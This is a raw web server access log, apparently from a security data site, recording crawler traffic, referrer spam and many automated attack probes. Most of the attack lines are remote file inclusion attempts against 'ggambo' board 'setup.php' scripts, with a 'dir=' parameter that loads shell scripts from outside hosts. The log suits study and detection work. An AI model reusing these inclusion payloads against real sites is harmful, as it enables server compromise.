136.243.14.137 - - [14/Feb/2015:01:56:03 -0800] "GET /robots.txt HTTP/1.0" 200 252 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)" 
136.243.14.137 - - [14/Feb/2015:01:56:10 -0800] "GET /honeypot//%22http://amunhoney.sourceforge.net//%22 HTTP/1.0" 404 284 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)" 
136.243.14.137 - - [14/Feb/2015:01:56:15 -0800] "GET /honeypot//%22http://glastopf.org//%22 HTTP/1.0" 404 303 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)" 
136.243.14.137 - - [14/Feb/2015:01:56:20 -0800] "GET /honeypot//%22http://www.maxmind.com/%22 HTTP/1.0" 404 303 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)" 
136.243.14.137 - - [14/Feb/2015:01:56:30 -0800] "GET /honeypot//%22https://twitter.com/sooshie/%22 HTTP/1.0" 404 303 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)" 
136.243.14.137 - - [14/Feb/2015:01:56:32 -0800] "GET /honeypot//%22https://twitter.com/theroxyd/%22 HTTP/1.0" 404 303 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)" 
207.46.13.0 - - [14/Feb/2015:02:53:37 -0800] "GET /maccdc2012/ftp.log.gz HTTP/1.1" 200 128116 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
104.130.161.113 - - [14/Feb/2015:03:23:44 -0800] "GET /honeypot///bbs/skin/ggambo7002_boardgallery//setup.php HTTP/1.1" 301 523 "-" "Tornado-Async-Client" 
104.130.161.113 - - [14/Feb/2015:03:23:44 -0800] "GET /honeypot///bbs/skin/ggambo7002_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.116 - - [14/Feb/2015:03:23:45 -0800] "GET /honeypot///bbs/skin/ggambo7002_boardgallery//setup.php HTTP/1.1" 301 523 "-" "Tornado-Async-Client" 
104.130.161.116 - - [14/Feb/2015:03:23:45 -0800] "GET /honeypot///bbs/skin/ggambo7002_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.116 - - [14/Feb/2015:03:23:49 -0800] "GET ///bbs/skin/ggambo7002_boardgallery//setup.php HTTP/1.1" 301 505 "-" "Tornado-Async-Client" 
104.130.161.116 - - [14/Feb/2015:03:23:49 -0800] "GET /bbs/skin/ggambo7002_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.117 - - [14/Feb/2015:03:23:50 -0800] "GET ///bbs/skin/ggambo7002_boardgallery//setup.php HTTP/1.1" 301 505 "-" "Tornado-Async-Client" 
104.130.161.117 - - [14/Feb/2015:03:23:50 -0800] "GET /bbs/skin/ggambo7002_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
66.249.73.247 - - [14/Feb/2015:03:35:36 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 304 168 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
192.99.153.116 - - [14/Feb/2015:03:46:46 -0800] "GET /honeypot/Honeypot HTTP/1.1" 404 295 "-" "-" 
104.130.161.117 - - [14/Feb/2015:05:02:34 -0800] "GET /honeypot////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 301 511 "-" "Tornado-Async-Client" 
104.130.161.117 - - [14/Feb/2015:05:02:34 -0800] "GET /honeypot////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.114 - - [14/Feb/2015:05:02:35 -0800] "GET /honeypot////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 301 511 "-" "Tornado-Async-Client" 
104.130.161.114 - - [14/Feb/2015:05:02:35 -0800] "GET /honeypot////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.115 - - [14/Feb/2015:05:02:37 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 511 "-" "Tornado-Async-Client" 
104.130.161.115 - - [14/Feb/2015:05:02:37 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.116 - - [14/Feb/2015:05:02:38 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 511 "-" "Tornado-Async-Client" 
104.130.161.116 - - [14/Feb/2015:05:02:39 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.115 - - [14/Feb/2015:05:02:39 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 301 491 "-" "Tornado-Async-Client" 
104.130.161.115 - - [14/Feb/2015:05:02:39 -0800] "GET /bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.114 - - [14/Feb/2015:05:02:40 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 301 491 "-" "Tornado-Async-Client" 
104.130.161.114 - - [14/Feb/2015:05:02:40 -0800] "GET /bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.115 - - [14/Feb/2015:05:02:42 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 492 "-" "Tornado-Async-Client" 
104.130.161.115 - - [14/Feb/2015:05:02:42 -0800] "GET /bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.114 - - [14/Feb/2015:05:02:44 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 492 "-" "Tornado-Async-Client" 
104.130.161.114 - - [14/Feb/2015:05:02:44 -0800] "GET /bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
189.51.98.73 - - [14/Feb/2015:05:21:31 -0800] "GET / HTTP/1.1" 301 483 "http://semalt.semalt.com/crawler.php?u=http://secrepo.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36" 
189.51.98.73 - - [14/Feb/2015:05:21:35 -0800] "GET / HTTP/1.1" 200 6788 "http://semalt.semalt.com/crawler.php?u=http://secrepo.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36" 
189.51.98.73 - - [14/Feb/2015:05:21:36 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36" 
195.154.211.26 - - [14/Feb/2015:05:55:52 -0800] "GET / HTTP/1.0" 200 21960 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.65 Safari/537.36 OPR/26.0.1656.24" 
199.59.148.210 - - [14/Feb/2015:07:37:57 -0800] "GET /robots.txt HTTP/1.1" 301 446 "-" "Twitterbot/1.0" 
199.59.148.210 - - [14/Feb/2015:07:37:57 -0800] "GET / HTTP/1.1" 301 427 "-" "Twitterbot/1.0" 
199.59.148.210 - - [14/Feb/2015:07:37:57 -0800] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.59.148.210 - - [14/Feb/2015:07:37:57 -0800] "GET / HTTP/1.1" 200 6732 "-" "Twitterbot/1.0" 
120.43.16.213 - - [14/Feb/2015:08:05:12 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 403200 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 1.0.3705)" 
120.43.16.213 - - [14/Feb/2015:08:05:16 -0800] "POST /honeypot/BSidesDFW%20-%202014.ipynb/trackback/ HTTP/1.1" 404 303 "http://www.secrepo.com/honeypot/BSidesDFW - 2014.ipynb" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 1.0.3705)" 
66.34.32.83 - - [14/Feb/2015:08:10:04 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279418 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" 
66.249.64.4 - - [14/Feb/2015:08:35:25 -0800] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.64.4 - - [14/Feb/2015:08:35:25 -0800] "GET / HTTP/1.1" 200 6787 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
177.139.79.27 - - [14/Feb/2015:08:53:39 -0800] "GET / HTTP/1.1" 301 483 "http://semalt.semalt.com/crawler.php?u=http://secrepo.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36" 
177.139.79.27 - - [14/Feb/2015:08:53:40 -0800] "GET / HTTP/1.1" 200 6788 "http://semalt.semalt.com/crawler.php?u=http://secrepo.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36" 
177.139.79.27 - - [14/Feb/2015:08:53:41 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36" 
104.130.161.116 - - [14/Feb/2015:09:08:17 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 484 "-" "Tornado-Async-Client" 
104.130.161.116 - - [14/Feb/2015:09:08:17 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "-" "Tornado-Async-Client" 
123.125.71.83 - - [14/Feb/2015:09:24:08 -0800] "GET / HTTP/1.1" 200 17520 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
220.181.108.79 - - [14/Feb/2015:09:24:33 -0800] "GET / HTTP/1.1" 200 17520 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
70.114.252.5 - - [14/Feb/2015:09:33:21 -0800] "GET / HTTP/1.1" 304 189 "http://t.co/Qro1LCR4GM" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2300.2 Safari/537.36" 
72.71.207.254 - - [14/Feb/2015:10:46:06 -0800] "GET / HTTP/1.1" 200 6788 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36" 
72.71.207.254 - - [14/Feb/2015:10:46:07 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36" 
104.130.161.114 - - [14/Feb/2015:12:37:00 -0800] "GET /honeypot///bbs/skin/ggambo7002_boardgallery//setup.php HTTP/1.1" 301 523 "-" "Tornado-Async-Client" 
104.130.161.114 - - [14/Feb/2015:12:37:01 -0800] "GET /honeypot///bbs/skin/ggambo7002_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.113 - - [14/Feb/2015:12:37:02 -0800] "GET /honeypot///bbs/skin/ggambo7002_boardgallery//setup.php HTTP/1.1" 301 523 "-" "Tornado-Async-Client" 
104.130.161.113 - - [14/Feb/2015:12:37:02 -0800] "GET /honeypot///bbs/skin/ggambo7002_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.117 - - [14/Feb/2015:12:37:05 -0800] "GET ///bbs/skin/ggambo7002_boardgallery//setup.php HTTP/1.1" 301 505 "-" "Tornado-Async-Client" 
104.130.161.117 - - [14/Feb/2015:12:37:06 -0800] "GET /bbs/skin/ggambo7002_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.116 - - [14/Feb/2015:12:37:07 -0800] "GET ///bbs/skin/ggambo7002_boardgallery//setup.php HTTP/1.1" 301 505 "-" "Tornado-Async-Client" 
104.130.161.116 - - [14/Feb/2015:12:37:07 -0800] "GET /bbs/skin/ggambo7002_boardgallery//setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
176.31.252.38 - - [14/Feb/2015:12:40:40 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
176.31.252.38 - - [14/Feb/2015:12:40:40 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
176.31.252.38 - - [14/Feb/2015:12:40:41 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
176.31.252.38 - - [14/Feb/2015:12:40:41 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
176.31.252.38 - - [14/Feb/2015:12:40:41 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
176.31.252.38 - - [14/Feb/2015:12:40:41 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
91.121.6.123 - - [14/Feb/2015:12:40:42 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
176.31.252.38 - - [14/Feb/2015:12:40:42 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
176.31.252.38 - - [14/Feb/2015:12:40:43 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
91.121.6.123 - - [14/Feb/2015:12:40:43 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
91.121.6.123 - - [14/Feb/2015:12:40:43 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
112.218.68.155 - - [14/Feb/2015:12:40:43 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
91.121.6.123 - - [14/Feb/2015:12:40:44 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
112.218.68.155 - - [14/Feb/2015:12:40:45 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
112.218.68.155 - - [14/Feb/2015:12:40:45 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
112.218.68.155 - - [14/Feb/2015:12:40:47 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
91.121.6.123 - - [14/Feb/2015:12:40:48 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 1.5; Windows NT)" 
176.31.252.38 - - [14/Feb/2015:12:40:49 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
91.121.6.123 - - [14/Feb/2015:12:40:50 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 1.5; Windows NT)" 
91.121.6.123 - - [14/Feb/2015:12:40:50 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 1.5; Windows NT)" 
176.31.252.38 - - [14/Feb/2015:12:40:50 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [14/Feb/2015:12:40:51 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
91.121.6.123 - - [14/Feb/2015:12:40:51 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 1.5; Windows NT)" 
176.31.252.38 - - [14/Feb/2015:12:40:51 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [14/Feb/2015:12:40:52 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [14/Feb/2015:12:40:52 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [14/Feb/2015:12:40:53 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [14/Feb/2015:12:40:54 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
174.136.14.201 - - [14/Feb/2015:12:41:14 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
174.136.14.201 - - [14/Feb/2015:12:41:16 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
1.224.163.80 - - [14/Feb/2015:12:41:16 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [14/Feb/2015:12:41:16 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
174.136.14.201 - - [14/Feb/2015:12:41:16 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
174.136.14.201 - - [14/Feb/2015:12:41:17 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
1.224.163.80 - - [14/Feb/2015:12:41:17 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [14/Feb/2015:12:41:18 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [14/Feb/2015:12:41:18 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [14/Feb/2015:12:41:18 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [14/Feb/2015:12:41:20 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
174.136.14.201 - - [14/Feb/2015:12:41:20 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
1.224.163.80 - - [14/Feb/2015:12:41:20 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
174.136.14.201 - - [14/Feb/2015:12:41:20 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
174.136.14.201 - - [14/Feb/2015:12:41:20 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
174.136.14.201 - - [14/Feb/2015:12:41:21 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
174.136.14.201 - - [14/Feb/2015:12:41:21 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
174.136.14.201 - - [14/Feb/2015:12:41:21 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
174.136.14.201 - - [14/Feb/2015:12:41:21 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
174.136.14.201 - - [14/Feb/2015:12:41:21 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
174.136.14.201 - - [14/Feb/2015:12:41:21 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
174.136.14.201 - - [14/Feb/2015:12:41:22 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
174.136.14.201 - - [14/Feb/2015:12:41:22 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
174.136.14.201 - - [14/Feb/2015:12:41:22 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
112.218.68.155 - - [14/Feb/2015:12:41:37 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)" 
112.218.68.155 - - [14/Feb/2015:12:41:39 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)" 
112.218.68.155 - - [14/Feb/2015:12:41:39 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)" 
112.218.68.155 - - [14/Feb/2015:12:41:40 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)" 
112.218.68.155 - - [14/Feb/2015:12:41:40 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)" 
112.218.68.155 - - [14/Feb/2015:12:41:41 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)" 
